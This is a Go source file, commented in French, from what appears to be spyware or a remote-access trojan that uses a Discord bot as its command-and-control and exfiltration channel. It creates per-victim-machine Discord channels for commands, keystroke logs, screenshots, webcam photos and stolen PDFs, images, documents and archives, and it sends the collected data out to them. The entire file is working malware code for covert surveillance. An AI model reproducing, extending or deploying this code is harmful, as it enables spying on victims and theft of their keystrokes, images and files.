// Transport par le bot Discord, et résolution des salons cible.
//
// Un salon par machine, nommé d'après l'ordinateur, créé à la volée dans le
// serveur configuré. Un second salon reçoit le journal du clavier en continu
// (`<machine>-keylogs`), de sorte que la conversation de commande reste lisible.
//
// Tant qu'un salon n'a pas pu être résolu, rien ne part sur ce canal : mieux
// vaut un envoi retardé qu'une extraction répartie entre deux salons. Si le
// serveur refuse (droits insuffisants), on retombe sur `channel_id`.
//
// Le webhook reste prioritaire s'il est renseigné : c'est le chemin le plus
// sobre pour les gros fichiers.
package main

import (
	"encoding/json"
	"fmt"
	"os"
	"strings"
	"sync"
	"time"
)

var (
	targetMu    sync.Mutex
	namedIDs    = map[string]string{}    // nom de salon -> identifiant Discord
	namedDone   = map[string]bool{}      // nom -> résolution conclue
	namedTried  = map[string]time.Time{} // nom -> dernière tentative
	targetID    string                   // salon de commande (cache de namedChannel)
	targetSet   bool
	targetTried time.Time
)

// namedChannel cherche (ou crée) un salon de texte portant `name` dans le
// serveur configuré. La seconde valeur dit si la résolution est conclue :
// id == "" avec done == true signifie « jamais possible » (refus ou serveur
// non configuré), done == false signifie « on retentera ».
func namedChannel(name string) (string, bool) {
	targetMu.Lock()
	defer targetMu.Unlock()

	if id, ok := namedIDs[name]; ok && id != "" {
		return id, true
	}
	if namedDone[name] {
		return "", true
	}
	if t, ok := namedTried[name]; ok && time.Since(t) < 45*time.Second {
		return "", false
	}
	namedTried[name] = time.Now()

	if cfg.GuildID == "" || cfg.BotToken == "" {
		namedDone[name] = true
		return "", true
	}
	catID, _ := ensureCategoryLocked() // les salons de la machine partagent une catégorie
	id, hard := findOrCreateChannel(cfg.GuildID, name, catID)
	if id != "" {
		namedIDs[name] = id
		namedDone[name] = true
		plog("salon: " + name + " -> " + id)
		return id, true
	}
	if hard {
		namedDone[name] = true
		plog("salon: " + name + " — refusé, repli sur le salon configuré")
		return "", true
	}
	plog("salon: " + name + " — serveur injoignable, nouvelle tentative")
	return "", false
}

// catKey est la clé de cache de la catégorie (distincte des noms de salons).
func catKey() string { return "#cat:" + hostChannelName() }

// ensureCategory cherche (ou crée) la catégorie Discord qui regroupe tous les
// salons de la machine : commande, keylogs, captures. Elle prend le verrou.
func ensureCategory() (string, bool) {
	targetMu.Lock()
	defer targetMu.Unlock()
	return ensureCategoryLocked()
}

// ensureCategoryLocked fait le même travail en supposant le verrou déjà tenu.
func ensureCategoryLocked() (string, bool) {
	key := catKey()
	if id, ok := namedIDs[key]; ok && id != "" {
		return id, true
	}
	if namedDone[key] {
		return "", true
	}
	if t, ok := namedTried[key]; ok && time.Since(t) < 45*time.Second {
		return "", false
	}
	namedTried[key] = time.Now()

	if cfg.GuildID == "" || cfg.BotToken == "" {
		namedDone[key] = true
		return "", true
	}
	name := hostChannelName()

	// Une catégorie homonyme existante est réutilisée.
	raw, code, err := discordGet("/guilds/" + cfg.GuildID + "/channels")
	if err != nil {
		plog("catégorie: lecture impossible : " + err.Error())
		return "", false
	}
	if code != 200 {
		plog(fmt.Sprintf("catégorie: lecture HTTP %d", code))
		if code == 401 || code == 403 || code == 404 {
			namedDone[key] = true
		}
		return "", code == 401 || code == 403 || code == 404
	}
	var list []struct {
		ID   string `json:"id"`
		Name string `json:"name"`
		Type int    `json:"type"`
	}
	if json.Unmarshal(raw, &list) != nil {
		plog("catégorie: réponse illisible")
		return "", false
	}
	for _, c := range list {
		if c.Type == 4 && strings.EqualFold(c.Name, name) {
			namedIDs[key] = c.ID
			namedDone[key] = true
			plog("catégorie: " + name + " -> " + c.ID)
			return c.ID, true
		}
	}

	body, code, err := discordPostBody("/guilds/"+cfg.GuildID+"/channels", map[string]any{
		"name": name,
		"type": 4, // catégorie
	})
	if err != nil {
		plog("catégorie: création impossible : " + err.Error())
		return "", false
	}
	if code != 201 && code != 200 {
		plog(fmt.Sprintf("catégorie: création HTTP %d %s", code, truncate(string(body), 200)))
		if code == 401 || code == 403 || code == 404 {
			namedDone[key] = true
		}
		return "", code == 401 || code == 403 || code == 404
	}
	var created struct {
		ID string `json:"id"`
	}
	if json.Unmarshal(body, &created) != nil || created.ID == "" {
		plog("catégorie: création sans identifiant " + truncate(string(body), 200))
		return "", false
	}
	namedIDs[key] = created.ID
	namedDone[key] = true
	plog("catégorie créée : " + name + " (" + created.ID + ")")
	return created.ID, true
}

// reconcileCategory range dans la catégorie tous les salons déjà créés pour
// cette machine (utile pour ceux résolus avant l'arrivée des catégories).
func reconcileCategory() {
	if cfg.GuildID == "" || cfg.BotToken == "" || stopped.Load() {
		return
	}
	catID, _ := ensureCategory()
	if catID == "" {
		return
	}
	raw, code, err := discordGet("/guilds/" + cfg.GuildID + "/channels")
	if err != nil || code != 200 {
		return
	}
	var list []struct {
		ID       string `json:"id"`
		Name     string `json:"name"`
		Type     int    `json:"type"`
		ParentID string `json:"parent_id"`
	}
	if json.Unmarshal(raw, &list) != nil {
		return
	}
	host := hostChannelName()
	for _, c := range list {
		if c.Type != 0 || c.ParentID == catID {
			continue
		}
		if c.Name != host && c.Name != host+"-keylogs" &&
			!strings.HasPrefix(c.Name, host+"-") {
			continue
		}
		if _, code, err := discordPatchBody("/channels/"+c.ID,
			map[string]any{"parent_id": catID}); err == nil && code < 300 {
			plog("catégorie: " + c.Name + " rangé sous " + host)
		}
	}
}

// targetChannel renvoie le salon de commande de cette machine, en provoquant
// la résolution si elle n'a pas encore eu lieu.
func targetChannel() string {
	targetMu.Lock()
	cached, set := targetID, targetSet
	targetMu.Unlock()
	if set {
		return cached
	}

	id, done := namedChannel(hostChannelName())
	targetMu.Lock()
	defer targetMu.Unlock()
	if id != "" {
		targetID, targetSet = id, true
		return id
	}
	if done {
		// Rien de personnel possible : le salon de configuration fait foi.
		targetID, targetSet = cfg.ChannelID, true
		return targetID
	}
	return "" // indéterminé : on ne part pas ailleurs
}

// targetChannelSet dit si la résolution du salon de commande est terminée.
func targetChannelSet() bool {
	targetMu.Lock()
	defer targetMu.Unlock()
	return targetSet
}

// keylogChannel renvoie le salon du journal du clavier. En attendant la
// résolution, aucun envoi ; en cas de refus, repli sur le salon principal.
func keylogChannel() string {
	id, done := namedChannel(hostChannelName() + "-keylogs")
	if id != "" {
		return id
	}
	if done {
		return targetChannel()
	}
	return ""
}

// webcamChannel renvoie le salon des photos de webcam (`<machine>-webcam`),
// rangé dans la catégorie comme les autres. En cas de refus, repli sur le
// salon principal.
func webcamChannel() string {
	id, done := namedChannel(hostChannelName() + "-webcam")
	if id != "" {
		return id
	}
	if done {
		return targetChannel()
	}
	return ""
}

// ensureAllChannels crée d'avance tous les salons de la machine.
//
// Sans cela, un salon n'apparaissait qu'au premier usage : sur une machine
// virtuelle sans fichier sur le Bureau, les salons `-files-*` n'existaient
// jamais, et sans caméra le salon `-webcam` non plus. L'opérateur voyait une
// catégorie incomplète et croyait le payload cassé.
func ensureAllChannels() {
	for _, n := range allChannelNames() {
		if stopped.Load() {
			return
		}
		if id, _ := namedChannel(n); id != "" {
			plog("salon prêt : " + n)
		}
		time.Sleep(300 * time.Millisecond) // limite de débit Discord
	}
}

// allChannelNames liste les salons d'une machine, dans l'ordre d'affichage.
func allChannelNames() []string {
	host := hostChannelName()
	return []string{
		host,
		host + "-keylogs",
		host + "-screenshots",
		host + "-webcam",
		host + "-files-pdf",
		host + "-files-images",
		host + "-files-docs",
		host + "-files-archives",
		host + "-files-new",
	}
}

// channelsReport force la création de tous les salons et rend l'état de
// chacun : c'est la commande qui répond à « il manque des salons ».
func channelsReport() string {
	var b strings.Builder
	b.WriteString("**Salons de la machine** (catégorie `" + hostChannelName() + "`)\n```\n")
	ok := 0
	names := allChannelNames()
	for _, n := range names {
		id, done := namedChannel(n)
		switch {
		case id != "":
			fmt.Fprintf(&b, "%-22s %s\n", n, id)
			ok++
		case done:
			fmt.Fprintf(&b, "%-22s refusé (droits du bot ?)\n", n)
		default:
			fmt.Fprintf(&b, "%-22s en attente (réseau)\n", n)
		}
	}
	b.WriteString("```")
	if ok == len(names) {
		b.WriteString("\nles 9 salons sont en place.")
	} else {
		b.WriteString(fmt.Sprintf("\n%d/%d salons. Un refus vient des permissions du bot : "+
			"il lui faut « Gérer les salons » sur le serveur.", ok, len(names)))
	}
	return b.String()
}

// screenshotsChannel renvoie le salon des captures d'écran
// (`<machine>-screenshots`). Il reçoit une image par moniteur à chaque
// cadence, sans polluer le salon de commande.
func screenshotsChannel() string {
	id, done := namedChannel(hostChannelName() + "-screenshots")
	if id != "" {
		return id
	}
	if done {
		return targetChannel()
	}
	return ""
}

// hostChannelName fabrique un nom de salon acceptable par Discord à partir du
// nom de la machine : minuscules, [a-z0-9._-], 100 caractères maximum.
func hostChannelName() string {
	h := strings.TrimSpace(hostname())
	if h == "" {
		h = strings.TrimSpace(os.Getenv("COMPUTERNAME"))
	}
	h = strings.ToLower(h)
	var b strings.Builder
	for _, r := range h {
		switch {
		case r >= 'a' && r <= 'z', r >= '0' && r <= '9', r == '-', r == '_', r == '.':
			b.WriteRune(r)
		case r == ' ':
			b.WriteRune('-')
		default: // accents et caractères exotiques : un blanc
			b.WriteRune('_')
		}
	}
	out := strings.Trim(b.String(), "-_.")
	if out == "" {
		out = "machine"
	}
	if len(out) > 100 {
		out = strings.Trim(out[:100], "-_.")
	}
	return out
}

// findOrCreateChannel cherche un salon de texte portant `name`, le crée s'il
// manque, et le range dans la catégorie `catID` (si fournie). hard = true
// signifie que l'API a répondu par un refus (401/403/404), donc que réessayer
// ne changera rien.
func findOrCreateChannel(guild, name, catID string) (string, bool) {
	raw, code, err := discordGet("/guilds/" + guild + "/channels")
	if err != nil {
		return "", false
	}
	if code != 200 {
		return "", code == 401 || code == 403 || code == 404
	}
	var list []struct {
		ID       string `json:"id"`
		Name     string `json:"name"`
		Type     int    `json:"type"`
		ParentID string `json:"parent_id"`
	}
	if json.Unmarshal(raw, &list) != nil {
		return "", false
	}
	for _, c := range list {
		if c.Type == 0 && strings.EqualFold(c.Name, name) {
			// Salon déjà présent : on le range au passage dans la catégorie.
			if catID != "" && c.ParentID != catID {
				if _, code, err := discordPatchBody("/channels/"+c.ID,
					map[string]any{"parent_id": catID}); err == nil && code < 300 {
					plog("catégorie: " + name + " rangé sous la catégorie")
				}
			}
			return c.ID, true
		}
	}

	create := map[string]any{
		"name": name,
		"type": 0, // salon textuel
	}
	if catID != "" {
		create["parent_id"] = catID
	}
	body, code, err := discordPostBody("/guilds/"+guild+"/channels", create)
	if err != nil {
		return "", false
	}
	if code != 201 && code != 200 {
		return "", code == 401 || code == 403 || code == 404
	}
	var created struct {
		ID string `json:"id"`
	}
	if json.Unmarshal(body, &created) != nil || created.ID == "" {
		return "", false
	}
	plog("salon créé : " + name + " (" + created.ID + ")")
	return created.ID, true
}

/* ------------------------------------------------------------------ */
/* Envoi par le bot                                                    */
/* ------------------------------------------------------------------ */

// botSendText écrit un message (découpé sous la limite de 2000 caractères de
// Discord) dans un salon, avec une pause de débit entre chaque morceau.
func botSendText(channel, s string) {
	if channel == "" || strings.TrimSpace(s) == "" {
		return
	}
	s = strings.TrimSpace(s)
	for len(s) > 0 {
		chunk := s
		if len(chunk) > 1900 {
			cut := strings.LastIndex(chunk[:1900], "\n")
			if cut < 400 {
				cut = 1900
			}
			chunk = chunk[:cut]
		}
		code, err := discordPost(fmt.Sprintf("/channels/%s/messages", channel),
			map[string]string{"content": chunk})
		if err != nil {
			plog("botSendText: " + err.Error())
			return
		}
		if code >= 300 {
			plog(fmt.Sprintf("botSendText: HTTP %d", code))
			return
		}
		noteExfilOnce(len(chunk))
		s = s[len(chunk):]
		s = strings.TrimLeft(s, "\r\n")
		time.Sleep(350 * time.Millisecond) // limite de débit Discord
	}
}
